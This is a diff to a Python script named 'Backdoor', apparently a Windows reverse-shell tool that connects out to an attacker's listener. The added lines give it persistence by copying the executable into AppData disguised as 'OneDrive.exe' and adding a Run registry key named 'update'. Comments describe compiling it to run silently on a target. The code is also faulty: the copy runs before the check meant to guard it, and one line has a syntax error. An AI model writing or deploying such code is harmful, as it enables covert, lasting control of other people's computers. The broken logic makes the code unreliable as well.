@@ -2,7 +2,7 @@
 #needs debugging to work in python3 - bytes-like object error
 #compile with --noconsole arg to run silently on target, see line 22
 
-import base64, json, os, socket, subprocess, sys
+import base64, json, os, shutil, socket, subprocess, sys
 
 #to open listening connection on target computer using netcat:
 #nc -vv -l -p 4444
@@ -10,8 +10,21 @@ import base64, json, os, socket, subprocess, sys
 
 class Backdoor:
     def __init__ (self, ip, port): #constructor method
+        self.become_persistent()
         self.connection = socket.socket(socket.AF_INET,  socket.SOCK_STREAM) #create instance of socket object
         self.connection.connect((ip, port)) #connect method from connection variable
+        
+    def become_persistent(self): #establish persistence by copying payload file to another location on target
+        payload_file_location = os.environ["appdata"] + "\\OneDrive.exe" #set location to AppData in Windows, rename file to
+        #OneDrive.exe
+        shutil.copyfile(sys.executable, payload_file_location) #sys.executable specifies executable;
+        #if using python file, you'd use __file__
+        #copy current payload file to new location
+        if not os.path.exists(payload_file_location) #if payload hasn't already been copied
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + payload_file_location + '"', shell=True)      
+            #wrap in double quotes so it will run correctly, ie /d "c:\example.exe"
+            #import os
+            #os.environ["appdata"] - returns location of appdata folder on windows
         
     def change_working_directory_to(self, path):
         os.chdir(path)
